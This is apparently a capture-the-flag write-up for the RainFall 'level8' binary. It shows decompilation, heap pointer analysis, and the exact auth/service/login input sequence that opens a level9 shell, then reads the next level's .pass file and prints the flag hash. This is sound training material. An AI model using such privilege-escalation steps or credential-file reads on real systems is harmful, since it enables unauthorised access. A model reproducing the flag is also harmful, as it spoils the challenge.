### Download binary
``scp -P4242 level8@192.168.31.170:/home/user/level8/level8 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

We try to understand what is happening. We quickly find that the goal is to write in a precise memory space.
The whole program is in a loop that work like this : you see the adress of two pointer, then you can write a keyword.
By analyzing the source code we find 3 keywords that allow us to write to different memory space.

There is :
-auth : Increment the adress of the pointer inside the first space by 16, or set it to ``0x804a008`` if it's empty (Note that for it to work you need to put a space after the word auth).

-service : Increment the adress of the pointer inside the second space by 16, or set it to ``0x804a018`` if it's empty.

-login : If the first space is nil, segfault, else if the right condition is set launch a ``/bin/bash``, if not just print ``Password:``.

After many try and main annalysis we found that for login to give us /bin/bash the second pointer need to be 32 bit higher than the first.
For example if the first is ``0x804a008`` then the second need to be ``0x804a028``.

**hint : to compile source.c, don't forget the -m32 flag. Else, each malloc will be *2 greater in 64 bits !**

----

### Building the payload

We want to achieve the setup that we explain :
``0x804a008`` In the first and
``0x804a028`` in the second.

So :

**Launching the binnary**
``level8@RainFall:~$ ./level8``
>(nil), (nil)

**Setting the first memory space**
``auth ``
>0x804a008, (nil)

**Setting the second memory space**
``service``
>0x804a008, 0x804a018

**Incrementing the second memory space**
``service``
>0x804a008, 0x804a028

**Get our /bin/bash**
``login``
>$

``whoami``
>level9

----

#### Getting the flag

``$ cat /home/user/level9/.pass``
>c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
